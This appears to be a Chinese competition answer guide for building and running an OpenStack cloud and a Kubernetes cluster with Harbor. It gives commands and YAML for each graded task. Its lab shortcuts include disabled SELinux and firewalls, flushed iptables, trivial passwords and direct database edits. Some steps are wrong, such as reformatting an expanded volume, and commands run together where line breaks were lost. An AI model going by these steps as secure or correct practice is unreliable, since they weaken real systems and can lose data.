在controller节点
yum install -y iaas-xiandianvi /etc/xiandian/openrc.sh  #tips: :%s/#// 去除#        :%s/PASS=/PASS=000000        source /etc/xiandian/openrc.shecho $INTERFACE_IP

在comopute节点
yum install -y iaas-xiandian#登录到controllerscp /etc/xiandian/openrc.sh root@172.17.31.20:/etc/xiandian/openrc.sh修改INTERFACE_IP即可source /etc/xiandian/openrc.shecho $INTERFACE_IP

2.搭建数据库组件使用提供的脚本框架 iaas-install-mysql.sh 填充脚本，在 controller 节点上安装 mariadb、mencached、rabbitmq 等服务并完成相关配置。完成后修改配置文件将 mencached 最大连接数修改为 2048。 
请将修改后的配置文件提交到答题框。【1 分】
在controller节点
iaas-install-mysql.sh#若配置文件忘记位置，可以通过查看iaas-install-mysql.sh查看位置vi /etc/sysconfig/memcachedMAXCONN=&quot;2048&quot;

3.搭建认证服务组件使用提供的脚本框架 iaas-install-keystone.sh 填充脚本，在 controlle r 节点上安装 keystone 服务并完成相关配置。完成后使用 openstack 命令请求 一个 token。 
请将以上命令和返回结果提交到答题框。【1 分】 
在controller节点
iaas-install-keystone.shopenstack token issue

4.搭建镜像服务组件使用提供的脚本框架 iaas-install-glance.sh 填充脚本，在 controller 节点上安装 glance 服务并完成相关配置。完成后请将 cirros-0.3.4-x86_64-disk.img 上传到控制节点的 &#x2F;root 目录下，然后使用 openstack 命令将该镜像上传到 openstack 平台镜像命名为 cirros。
请将镜像上传的操作命令和返回结果提交到答题框。【1 分】
在controller节点
iaas-install-glance.shopenstack image create --disk-format qcow2 --container-format bare  --shared cirros &lt;/root/cirros-0.3.4-x86_64-disk.img 

5.搭建计算服务组件使用提供的脚本框架 iaas-install-nova-controller.sh 和 iaas-install-nova-compute.sh 填充脚本，在 controller 和 compute 节点上安装 nova 服务并完成配置。完成后请将控制节点的计算资源也加入集群。然后使用 openstack 命令列出能提供计算资源的节点。
将列出计算资源的命令和返回结果提交到答题框。【1.5 分】
在controller节点
iaas-install-nova-controller.sh

在compute节点
iaas-install-nova-compute.sh

controller：
#将控制节点的计算资源也加入集群把compute节点的名称和IP都改成controller节点的名称和IPvi /etc/iaas-openstack/openrc.shHOST_IP_NODE=172.17.31.10HOST_NAME_NODE=controlleriaas-install-nova-compute.sh#建议执行完毕后改回

修改nova配置
cat /etc/nova/nova.conf[libvirt]virt_type=qemu		##在[libvirt]下添加此行即可

6.搭建网络组件并初始化网络使用提供 的脚本框架 iaas-install-neutron-controller.sh 和 iaas-install-neutron-compute.sh，填充脚本，在 controller 和 compute 节点上安装 neutron 服务并完成配置。创建云主机外部网络 ext-net，子网为 ext-subnet，云主机浮动 IP 可用网段为 172.18.x.100172.18.x.200，网关为 172.18.x.1。创建云主机内部网络 int-net1，子网为 int-subnet1，云主机子网 IP 可用网段为 10.0.0.10010.0.0.200，网关为 10.0.0.1；创建云主机内部网络 int-net2，子网为 int-subnet2，云主机子网 IP 可用网段为 10.0.1.100 ~ 10.0.1.200，网关为 10.0.1.1。添加名为 ext-router 的路由器，添加网关在 ext-net 网络，添加内部端口到 int-net1 网络，完成内部网络 int-net1 和外部网络的连通。 
请使用 openstack 命令完成以下任务，完成后将命令和返回结果提交到答题框。【4 分】
controller
iaas-install-neutron-controller.sh

compute
iaas-insta ll-neutron-compute.sh

创建网络(controller)
#创建外部网络openstack network create --external  --provider-physical-network provider --provider-network-type flat   ext-net#给外部网络绑定ipopenstack subnet create  --network ext-net --subnet-range 172.18.31.0/24 --gateway 172.18.31.1 --allocation-pool start=172.18.31.100,end=172.18.31.200 --dhcp  ext-subnet#创建int-net1（云主机子网 IP 可用网段为 10.0.0.100~10.0.0.200，网关为 10.0.0.1）openstack network create --internal int-net1#创建int-net1网段int-subnet1openstack subnet create --subnet-range 10.0.0.0/24  --gateway 10.0.0.1 --dhcp --allocation-pool start=10.0.0.100,end=10.0.0.200  --network int-net1 int-subnet1#创建int-net2（云主机子网 IP 可用网段为 10.0.1.100 ~ 10.0.1.200，网关为 10.0.1.1）openstack network create --internal int-net2#创建int-net2网段openstack subnet create --subnet-range 10.0.1.0/24  --gateway 10.0.1.1 --dhcp --allocation-pool start=10.0.1.100,end=10.0.1.200  --network int-net2 int-subnet2#添加路由ext-routeropenstack router create ext-routeropenstack router set --enable --enable-snat --external-gateway ext-net ext-routeropenstack router add subnet ext-router int-subnet1



7.搭建图形化界面使用提供的脚本框架 iaas-install-dashboard.sh，填充脚本，在 controller 节点上安装 dashboard 服务并完成相关配置。 
请使用 curl 指令获取 dashboard 首页信息，将获取到的首页信息提交到答 题框。【1 分】 
controller
iaas-install-dashboard.sh curl -L http://192.168.100.10/dashboard

任务 3 OpenStack 运维任务1.用户管理在 keystone 中创建用户 testuser，密码为 password。创建好之后，使用命令修改 testuser 密码为 000000，并查看 testuser 的详细信息。添加将该 用户添加到 admin 项目并赋予普通用户权限，完成后测试登录。 
使用 testuser 用登录系统完成后截图并提交到答题框。【1 分】
openstack user create  testuser  --password password --domain demoopenstack user set testuser --password 000000openstack user show testuser+---------------------+----------------------------------+| Field               | Value                            |+---------------------+----------------------------------+| domain_id           | ff1e0a9d790046209bd22307ca565a8e || enabled             | True                             || id                  | 79ab69675e6a454a83fc1f13bd884315 || name                | testuser                         || options             | &#123;&#125;                               || password_expires_at | None                             |+---------------------+----------------------------------+openstack role add user --user testuser --project admin 

2.服务查询使用命令列出服务目录和端点，查看 glance 服务的端点。将以上命令和返 
回结果提交到答题框。【0.5 分】
openstack service list #查看服务目录openstack endpoint list #查看服务端点openstack endpoint list | grep glance

3.镜像管理登录 controller 节点，使用 glance 相关命令，上传镜像，源使用 CentOS_6.5_x86_64_XD.qcow2，名字为 testone，然后使用 openstack 命令修改这个镜像名改为 examimage，然后给这个镜像打一个标签，标签名字为 lastone 改完后使用 openstack 命令查看镜像列表。
将以上命令和返回结果提交到答题框。【2 分】
glance image-create --name testone --disk-format qcow2 --container bare --file /opt/images/CentOS_6.5_x86_64_XD.qcow2 openstack image set --name examiage --tag lastone testone

4.后端配置文件管理进入到glance 后端存储目录中，使用 qemu 命令查看任意的一个镜像信息。使用 du 命令查看 nova 主配置文件大小。 
将以上命令和返回结果提交到答题框。【0.5 分】 
cd /var/lib/glance/images/#qemu-img info &lt;文件名称&gt;qemu-img info 6ca6669e-cc71-4f51-becf-b5db53c212f1

5.存储服务管理创建一个卷类型，然后创建一块带这个卷类型标识的云硬盘，查询该云硬盘的详细信息。将该云硬盘挂载到虚拟机中，将该云硬盘格式化为 xfs。创建一个文件文件名为工位号内容为工位号，然后将该云硬盘卸载，使用 openstack 命令将该云硬盘修改为只读状态，再次挂载后查看是否存在原始文件，然后再次向该云硬盘中创建一个文件，文件名为工位号_02。 
将返回结果及解题过程提交到答题框。【2 分】 
#创建卷类型 openstack volume type create lvm1#创建卷 openstack volume create --size 10 --type lvm1 juan1#查看卷详细信息  openstack volume show juan1 #将云硬盘挂载到虚拟机中openstack server add volume centos juan1#将云硬盘格式化为xfsmkfs.xfs /dev/vdb#挂在创建文件mount /dev/vdb /mnttouch /mnt/31umount /mnt#云硬盘卸载openstack server remove volume centos juan1#设置为只读openstack volume set juan1 --read-only#将云硬盘挂载到虚拟机中openstack server add volume centos juan1#挂在创建文件mount /dev/vdb /mnttouch /mnt/31_02显示不成功



6.存储服务管理使用命令创建一个 5GB 的云硬盘，名称为 disk-2，将云硬盘挂载到云虚拟机内，然后格式化为 ext4，挂载到虚拟机的 &#x2F;mnt&#x2F; 目录下，使用 df -h 将命令和返回信息提交到答题框。将该云硬盘使用命令卸载，使用命令将该云硬盘扩容到 10GB，使用命令将云硬盘挂载到云主机上，将命令及返回信息提交到答题框。进入云主机使用命令扩容文件系统，扩容后再次挂载到 &#x2F;mnt&#x2F;使用 df -hT 命令并将命令和返回信息提交到答题框。【2 分】。
#创建云硬盘openstack volume create --size 5 &#x27;disk-2&#x27;#挂载openstack server add volume centos disk-2#格式化mkfs.ext4 /dev/vdbmount /dev/vdb /mntdf-h#卸载umount /mntopenstack server remove volume centos disk-2#扩容openstack volume set --size 10 &#x27;disk-2&#x27;#挂载openstack server add volume centos disk-2#格式化mkfs.ext4 /dev/vdbmount /dev/vdb /mntdf -hT

7.对象存储管理使用 swift 相关命令，创建一个容器，然后往这个容器中上传一个文件（文件可以自行创建），上传完毕后，使用命令查看容器。 
将以上命令和返回结果提交到答题框。【0.5 分】
swift post containerswift upload  container /root/cirros-0.3.4-x86_64-disk.imgswift list container

8.安全组管理使用命令创建名称为 group_web 的安全组该安全组的描述为工位号，为该安全组添加一条规则允许任意 ip 地址访问 web 流量，完成后查看该安全组的详细信息。
将以上命令和返回结果提交到答题框。【2 分】 
openstack security group create group_web --description 31openstack security group rule create group_web --protocol tcp --dst-port 80:80 --remote-ip 0.0.0.0/0openstack security group rule create group_web --protocol tcp --dst-port 443:443 --remote-ip 0.0.0.0/0openstack security group show group_web

9.网络管理使用命令将int-net1网络设置为共享，然后查看int-net1网络的详细信息。 
将命令和返回信息提交到答题框。
openstack network set --share  int-net1

10.网络管理使用 dashboard 界面使用 centos7.5 镜像创建一台云主机，云主机命名为 test-01，使用命令查看浮动 IP 地址池，使用命令创建一个浮动 IP，然后将浮动IP 绑定到云主机上。
将命令和返回信息提交到答题框。【1 分】 
openstack floating ip create ext-netopenstack server add floating ip test-01 172.18.31.118

11.虚拟机管理使用 opentack 命令利用 centos7.5 镜像创建一台云主机，连接 int-net1 网 络，云主机名称为 test-02。创建成功后使用命令查看云主机详细信息，确定该云主机是处于计算节点还是控制节点。如果云主机处于控制节点上请将其冷迁移到计算节点，如果如果云主机处于计算节点上请将其冷迁移到控制节点。 
本题全部流程请使用命令完成，请将全部命令和结果粘贴到答题框。【3 分】
一、冷迁移1、在控制节点关闭虚拟机2、在计算节点找到实例位置（&#x2F;var&#x2F;lib&#x2F;nova&#x2F;instances）3、将计算节点的需要转移的实例文件copy到目标主机的相同位置下。4、到目标主机，赋予实例权限5、登录数据库更改mysql的host，node字段为新的物理主机名。6、重启目标主机的nova-compute服务
#查看虚拟机在哪个节点openstack service show test-02#停止准备迁移的主机openstack server stop test-02#迁移cd /var/lib/nova/instances/scp 1f03d8ae-1190-49b5-9590-c7bee2912f69/ root@172.17.31.10:/var/lib/nova/instances/#登录并赋予权限cd  /var/lib/nova/instances/chown nova:nova 1f03d8ae-1190-49b5-9590-c7bee2912f69/ -R#登录mysql(根据虚拟机位置更改，登录数据库更改MySQL中的host、node字段为新的物理主机名字)mysql -uroot -p&gt; use nova; update instances set host=&#x27;controller&#x27;, node=&#x27;controller&#x27; where uuid=&#x27;1f03d8ae-1190-49b5-9590-c7bee2912f69&#x27;;&gt;exit#重启节点systemctl restart openstack-nova-compute.service



B 场次题目：容器的编排与运维
任务 1 容器云平台环境初始化1.容器云平台的初始化根据表 2 的 IP 地址规划，创建云服务器，镜像使用CentOS_7.5_x86_64_XD.qcow，确保网络正常通信。按照表 2 置主机名节点并关闭 swap，同时永久关闭 selinux 以及防火墙,并修改 hosts 映射。 
请将 master 节点 hosts 文件内容提交到答题框。【1 分】
Master
hostnamectl set-hostname mastersetenforce 0vi /etc/selinux/config   SELINUX=disabledswapoff -asystemctl stop firewalldsystemctl disable firewalld vi /etc/hosts10.0.0.1/24 master10.0.0.2/24 node110.0.0.3/24 node210.0.0.4/24 harbor

Node1
hostnamectl set-hostname node1setenforce 0vi /etc/selinux/config   SELINUX=disabledswapoff -asystemctl stop firewalldsystemctl disable firewalld 

Node2
hostnamectl set-hostname node2setenforce 0vi /etc/selinux/config   SELINUX=disabledswapoff -asystemctl stop firewalldsystemctl disable firewalld 

Harbor
hostnamectl set-hostname haborsetenforce 0vi /etc/selinux/config   SELINUX=disabledswapoff -asystemctl stop firewalldsystemctl disable firewalld 

2.Yum源数据的持久化挂载将提供的 CentOS-7-x86_64-DVD-1804.iso 和 chinaskills_cloud_paas.iso 光盘镜像上传到 master 节点 &#x2F;root 目录下，然后在 &#x2F;opt 目录下使用命令创建&#x2F;centos 目录和 &#x2F;paas 目录，并将镜像文件 CentOS-7-x86_64-DVD-1804.iso 挂载到&#x2F;centos 目录下，将镜像文件 chinaskills_cloud_paas.iso 挂载到 &#x2F;paas目录下。请设置永久开机自动挂载，并将设置的永久开机自动挂载的文件内容提交到+答题框。【1 分】
Master
mkdir /opt/centosmkdir /opt/paasmount CentOS-7-x86_64-DVD-1804.iso  /opt/centosmount chinaskills_cloud_paas.iso /opt/paasvi /etc/fstab/root/CentOS-7-x86_64-DVD-1804.iso  /opt/centos iso9660 defaults 0 0/root/chinaskills_cloud_paas.iso /opt/paas iso9660 defaults 0 0mount -a

3.Yum源的编写为 master 节点设置本地 yum 源，yum 源文件名为 centos.repo，安装 ftp 服务，将 ftp 仓库设置为 &#x2F;opt&#x2F;，为其他节点配置 ftp 源，yum 源文件名称为 ftp.repo，其中 ftp 服务器地址为 master 节点 IP。 
请将其它节点的 yum 源文件内容提交到答题框。【1 分】
Master
mv /etc/yum.repos.d/* /etc/yumvi /etc/yum.repos.d/centos.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[k8s]name=k8sbaseurl=file:///opt/paas/kubernetes-repogpgcheck=0enabled=1#安装vsftpd服务yum install -y vsftpdvi /etc/vsftpd/vsftpd.conf  anon_root=/opt/systemctl start vsftpdsystemctl enable vsftpdiptables -Fiptables -Xiptables -Z/usr/sbin/iptables-save

其他节点
mv /etc/yum.repos.d/* /etc/yumvi /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://10.0.0.1/centosgpgcheck=0enabled=1[k8s]name=k8sbaseurl=ftp://10.0.0.1/paas/kubernetes-repogpgcheck=0enabled=1iptables -Fiptables -Xiptables -Z/usr/sbin/iptables-save

4.设置时间同步服务器在 master 节点上部署 chrony 服务器，允许其他节点同步时间，启动服务并设置为开机启动；在其他节点上指定 master 节点为上游 NTP 服务器，重启服务并设为开机启动。
请在 master 节点上使用 chronyc 命令同步控制节点的系统时间。【1 分】 
Master
vi /etc/chrony.conf  # Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver master iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics trackingallow 10.0.0.0/24local stratum 10systemctl restart chronydsystemctl enable chronyd

其他节点
vi /etc/chrony.conf# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver master iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics trackingsystemctl restart chronydsystemctl enable chronyd

5.设置免密登录为四台服务器设置免密登录，保证 3 台服务器能够互相免密登录。请使用 scp 命令将 master 节点的 hosts 文件发送到所有节点的 &#x2F;etc&#x2F;hosts。将以上所有命令和返回结果提交到答题框。【1 分】
Master
ssh-keygen ssh-copy-id root@10.0.0.2ssh-copy-id root@10.0.0.3ssh-copy-id root@10.0.0.4scp /etc/hosts root@10.0.0.2:/etc/hostsscp /etc/hosts root@10.0.0.3:/etc/hostsscp /etc/hosts root@10.0.0.4:/etc/hosts

任务 2 Kubernetes 搭建任务（10 分）1.安装docker应用在所有节点上安装 dokcer-ce。并在 harbor 节点安装 harbor 仓库，显现正常登录 horbor 仓库，登录密码设置为“test_工位号”。请将登录后截图提交到 
答题框。【1 分】 
所有节点
#安装依赖yum install -y yum-utils lvm2 device-mapper-*#安装docker-ceyum install -y docker-cesystemctl start dockersystemctl enable docker

Harbor
#安装docker-composecp -rfv /opt/docker-compose/v1.25.5-docker-compose-Linux-x86_64 /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-composedocker-compose version#安装harbortar -zxvf harbor-offline-installer-v2.1.0.tgzcd harborcp harbor.yml.tmpl harbor.ymlvi harbor.yml   hostname: 10.0.0.4 # 将域名修改为本机IP  harbor_admin_password: test_31./prepare./install.sh --with-clair

2.搭建harbor仓库修改默认 docker 仓库为 horbor 地址，修改 docker 启动引擎为 systemd。安装完成后执行 docker verison 命令返回结果以及将 daemon.json 文件内容提交。【2 分】
所有节点
tee /etc/docker/daemon.json &lt;&lt;&#x27;EOF&#x27;&#123;  &quot;insecure-registries&quot; : [&quot;10.0.0.4:5000&quot;],  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]&#125;EOFsystemctl restart dockerdocker version

3.安装 docker-compose在 master 节点上使用 &#x2F;opt&#x2F;paas&#x2F;docker-compose&#x2F;v1.25.5-docker-compose-Linux-x86_6 下的文件安装 docker-compose。安装完成后执行 docker-compose version 命令，请将程序返回结果提交到答题框。【0.5 分】
Master
cp -rfv /opt/docker-compose/v1.25.5-docker-compose-Linux-x86_64 /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-composedocker-compose version

4.上传docker镜像在 master 节点使用 &#x2F;opt&#x2F;paas&#x2F; k8s_image_push.sh 将所有镜像上传至 docker 仓库。完成后将 Harbor 仓库 library 中镜像列表截图，请将以上截图提交到答题框。【1 分】
①.创建CA证书（harbor）
mkdir /cert/ -pcd /cert/ #以下命令创建ca证书openssl req  -newkey rsa:4096 -nodes -sha256 -keyout ca.key -x509 -days 365 -out ca.crt#一路回车出现Common Name 输入IP或域名Common Name (eg, your name or your server&#x27;s hostname) []:10.0.0.4

②.生成证书签名请求
openssl req  -newkey rsa:4096 -nodes -sha256 -keyout 10.0.0.4.key -out 10.0.0.4.csr一路回车出现Common Name 输入IP或域名Common Name (eg, your name or your server&#x27;s hostname) []:10.0.0.4

③生成证书
echo subjectAltName = IP:10.0.0.4 &gt; extfile.cnfopenssl x509 -req -days 365 -in 10.0.0.4.csr -CA ca.crt -CAkey ca.key -CAcreateserial -extfile extfile.cnf -out 10.0.0.4.crt

④配置harbor.yml
tar -zxvf harbor-offline-installer-v2.0.1.tgzcd harborcp harbor.yml.tmpl harbor.ymlhostname=10.0.0.4ssl_cert = /cert/10.0.0.4.crt     #crt位置ssl_cert_key = /cert/10.0.0.4.key  #key的位置     

⑤配置使用harbor
./prepare./install.sh

因为是自签证书需要添加到信任
每一个客户端都需要复制上面的ca.crt到Docker相应目录，然后重启Docker。
mkdir –p /etc/docker/certs.d/10.0.0.4cp ca.crt /etc/docker/certs.d/10.0.0.4/ca.crtsystemctl restart docker

注意：
#在使用k8s_image_pull.sh可能不成功原因一：前面的k8s_harbor_install中有一个命令未使用 for i in $(ls /opt/images|grep tar); do   docker load -i /opt/images/$i  done 原因二：目录不正确，需要更改目录 /opt（按题目叙述）

5.安装 kubeadm 工具在 master 及 node 节点安装 Kubeadm 工具并设置开机自动启动，安装完成后使用 rpm 命令配合 grep 查看 Kubeadm 工具是否正确安装。
将 rpm 命令配合 grep返回结果提交到答题框。【0.5 分】 
yum -y install kubeadm-1.18.1 kubectl-1.18.1 kubelet-1.18.1systemctl enable kubelet &amp;&amp; systemctl start kubelet  rpm -qa | grep ku

6.计算节点获取必备镜像在所有 node 节点中使用 docker 命令拉取安装 kubernetes 基础镜像，拉取完成后使用 docker 命令查看镜像列表。【1 分】
docker pull ...docker images

7.kubeadm 安装 master使用 kubeadm 命令初始化 master 节点，设置 kubernetes 虚拟内部网段地址为 10.244.0.0&#x2F;16，然后使用 kube-flannel.yaml 完成控制节点初始化设置，完成后使用命令查看集群状态和所有 pod。 
将以上命令和返回结果提交到答题框。【2 分】
master
#开启路由转发cat &gt;&gt; /etc/sysctl.d/k8s.conf &lt;&lt;EOFnet.ipv4.ip_forward = 1 net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 EOFsysctl --system  //生效#初始化kubeadm init --apiserver-advertise-address=192.168.200.162 --kubernetes-version=&quot;v1.18.0&quot; --pod-network-cidr=10.244.0.0/16 --image-repository=registry.aliyuncs.com/google_containers --service-cidr=10.96.0.0/12#部署网络 kubectl apply -f kube-flannel.yaml #查看状态kubectl get pod -Akubectl get cs

8.安装 kubernetes 网络插件使用 kube-flannel.yaml 安装 kubernetes 网络插件，安装完成后使用命令查看节点状态。完成后使用命令查看集群状态。将集群状态查看命令和返回结果 
提交到答题框。【0.5 分】 
9.kubernetes 图形化界面的安装安装 kubernetes dashboard 界面，完成后查看首页然后将 kubernetes dashboard 界面截图提交到答题框。【1 分】 
①创建证书
mkdir dashboard-certscd dashboard-certs/kubectl create namespace kubernetes-dashboardopenssl genrsa -out dashboard.key 2048openssl req -days 36000 -new -out dashboard.csr -key dashboard.key -subj &#x27;/CN=dashboard-cert&#x27;openssl x509 -req -in dashboard.csr -signkey dashboard.key -out dashboard.crtkubectl create secret generic kubernetes-dashboard-certs --from-file=dashboard.key --from-file=dashboard.crt -n kubernetes-dashboard

②安装dashboard
kubectl apply -f recommended.yaml #查看状态kubectl get pod,svc -n kubernetes-dashboard kubectl apply -f dashboard-adminuser.yaml 

访问dashboard（https://IP:30000）
获取token
kuebctl get secret -n kubernetes-dashboardkubectl describe secret -n kubernetes-dashboard &lt;sec名称&gt;

10.扩展计算节点在 master 节点上使用 kubeadm 命令查看 token，在所有 node 节点上使用 kubeadm 命令将 node 节点加入 kubernetes 集群。完成后在 master 节点上查看所有节点状态。将集群状态查看命令和返回结果提交到答题框。【0.5 分】
#查看tokenkubeadm token list#查看--discovery-token-ca-cert-hash值openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2&gt;/dev/null | openssl dgst -sha256 -hex | sed &#x27;s/^.* //&#x27;kubeadm join 192.168.200.162:6443 --token qi3pfd.mv5s93kio6jb4m7s \    --discovery-token-ca-cert-hash sha256:c559bb4420ee1e071655498290a39fd4e0a0126c239b3be7cb1065b5b9f971d5

任务 3 Kubernetes 运维任务（15 分）1.使用 dockerfile 构建 dokcer 镜像以 mysql:5.7 镜像为基础镜像，制作一个 mysql 镜像，可以将提供的 sql 文件初始化到 mysql 数据库中，然后使用编写的 dockerfile 文件将镜像制作出来，名称为 mysql:latest，并将该镜像上传至前面所搭建的 harbor 仓库中，编写 YAML 文件，验证数据库内容。
master
vi DockerfileFROM mysql:5.7MAINTAINER ywjWORKDIR /docker-entrypoint-initdb.dENV MYSQL_ROOT_PASSWORD=123456COPY gpmall.sql /opt/sql/COPY init.sql /docker-entrypoint-initdb.d/                                  

init.sqlgrant all on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;create database gpmall default character set=utf8;use gpmall;source /opt/sql/gpmall.sql;

将sql文件放在本目录中
2.持久化存储搭建 NFS 共享存储，配置 nfs-provisioner，创建 storageclass，通过 storageclass 动态生成 pvc，大小为 1Gi，修改标准 nfs-deployment.yaml 文件，编写 storageclass.yaml 和 pvc.yaml 文件，将最终 pvc 状态截图和 yaml 文件提 
交至答题框。【2 分】
部署流程

创建一个可用的NFS Server
创建Service Account，这是用来管控NFS Provisioner 在k8s集群中运行的权限
创建StorageClass，负责建立PVC并调用NFS provisioner进行预定的工作，并让PV与PVC建立关联
创建NFS provisioner，有两个功能，一个是在NFS共享目录下创建挂载点(volume)，另一个则是建了PV并将PV与NFS的挂载点建立关联

安装nfs-server,并完成配置
yum install -y nfs-utils rpcbind #其它node节点yum install -y nfs-utils(不要启动)vi /etc/exports/nfsdata *(rw,sync,no_root_squash,no_subtree_check)systemctl start nfs-server rpcbindsystemctl enable nfs-server rpcbind#查看是否就绪showmount -e

编写serviceaccount.yaml
apiVersion: v1kind: ServiceAccountmetadata:  name: nfs-client-provisioner  namespace: demo---kind: ClusterRoleapiVersion: rbac.authorization.k8s.io/v1metadata:  name: nfs-client-provisioner-runnerrules:  - apiGroups: [&quot;&quot;]    resources: [&quot;nodes&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]  - apiGroups: [&quot;&quot;]    resources: [&quot;persistentvolumes&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;delete&quot;]  - apiGroups: [&quot;&quot;]    resources: [&quot;persistentvolumeclaims&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;update&quot;]  - apiGroups: [&quot;storage.k8s.io&quot;]    resources: [&quot;storageclasses&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]  - apiGroups: [&quot;&quot;]    resources: [&quot;events&quot;]    verbs: [&quot;create&quot;, &quot;update&quot;, &quot;patch&quot;]---kind: ClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata:  name: run-nfs-client-provisionersubjects:  - kind: ServiceAccount    name: nfs-client-provisioner    namespace: demoroleRef:  kind: ClusterRole  name: nfs-client-provisioner-runner  apiGroup: rbac.authorization.k8s.io---kind: RoleapiVersion: rbac.authorization.k8s.io/v1metadata:  name: leader-locking-nfs-client-provisioner  namespace: demorules:  - apiGroups: [&quot;&quot;]    resources: [&quot;endpoints&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;patch&quot;]---kind: RoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata:  name: leader-locking-nfs-client-provisioner  namespace: demosubjects:  - kind: ServiceAccount    name: nfs-client-provisioner    namespace: demoroleRef:  kind: Role  name: leader-locking-nfs-client-provisioner  apiGroup: rbac.authorization.k8s.io

编写stroageclass.yaml
apiVersion: storage.k8s.io/v1kind: StorageClassmetadata:  name: managed-nfs-storage  annotations:    storageclass.kubernetes.io/is-default-class: &quot;true&quot;  # 是否设置为默认的storageclassprovisioner: k8s/nfs-subdir-external-provisioner # or choose another name, must match deployment&#x27;s env PROVISIONER_NAME&#x27;allowVolumeExpansion: trueparameters:  archiveOnDelete: &quot;false&quot; # 设置为&quot;false&quot;时删除PVC不会保留数据,&quot;true&quot;则保留数据

编写nfs-deployment.yaml
apiVersion: apps/v1kind: Deploymentmetadata:  name: nfs-client-provisioner  labels:    app: nfs-client-provisioner  namespace: demospec:  replicas: 1  strategy:    type: Recreate  selector:    matchLabels:      app: nfs-client-provisioner  template:    metadata:      labels:        app: nfs-client-provisioner    spec:      nodeName: master   #设置在master节点运行      tolerations:           #设置容忍master节点污点        - key: node-role.kubernetes.io/master          operator: Equal          value: &quot;true&quot;      serviceAccountName: nfs-client-provisioner      containers:        - name: nfs-client-provisioner          image: 192.168.200.165/library/nfs-client-provisioner@sha256:4c16495be5b893efea1c810e8451c71e1c58f076494676cae2ecab3a382b6ed0          imagePullPolicy: IfNotPresent          volumeMounts:            - name: nfs-client-root              mountPath: /persistentvolumes          env:            - name: PROVISIONER_NAME              value: k8s/nfs-subdir-external-provisioner            - name: NFS_SERVER              value: 192.168.200.162            - name: NFS_PATH              value: /nfsdata      volumes:        - name: nfs-client-root          nfs:            server: 192.168.200.162  # NFS SERVER_IP            path: /nfsdata

编写pvc.yaml
apiVersion: v1kind: PersistentVolumeClaimmetadata:  name: nfs-claimspec:  storageClassName: managed-nfs-storage  accessModes: [&quot;ReadWriteMany&quot;,&quot;ReadOnlyMany&quot;]  resources:    requests:      storage: 1Gi



3.编写deployment.yaml文件将提供的 nginx:latest 镜像上传至 harbor 镜像仓库，使用该镜像编写 deployment 文件，要求将已创建的 pvc 挂载至&#x2F;html 目录下，副本数 1，实现资源限制:需求内存 300Mi，需求 CPU 300M，限制内存 450Mi，限制 CPU450M，将 POD 状态截图和 yaml 文件提交至答题框。【3 分】
#若报错请删除污点kubectl taint nodes master node-role.kubernetes.io/master- 

nginx.yaml
apiVersion: apps/v1kind: Deploymentmetadata:   name: nginx   namespace: defaultspec:  replicas: 1  selector:    matchLabels:      app: nginx  template:    metadata:      labels:        app: nginx    spec:      containers:        - name: nginx          image: 10.0.0.1/library/nginx@sha256:416d511ffa63777489af47f250b70d1570e428b67666567085f2bece3571ad83          volumeMounts:            - name: nfs-pv              mountPath: /html          resources:            limits:              cpu: 450m              memory: 450Mi            requests:              cpu: 300m              memory: 300Mi      volumes:        - name: nfs-pv          persistentVolumeClaim:            claimName: nfs-claim


4.创建 service 服务，提供对外访问接口基于 nginx 的 pod 服务，编写一个 service 名称为 nginx-svc，代理 nginx的服务端口，端口类型为 nodeport，创建成功后可以通过该 service 访问 nginx。
完成后提交 yaml 文件及访问截图至答题框。【3 分】
apiVersion: v1kind: Servicemetadata:  name: nginx-svc  namespace: defaultspec:  selector:    app: nginx  type: NodePort  ports:     - port: 80      targetPort: 80

5.配置 metrics-server 实现资源监控将已提供的 metrics-server 镜像上传至 harbor，修改 components.yaml，创建 metrics-server，完成后，将 metrics-server 状态截图提交至答题框。【2分】
1、修改配置
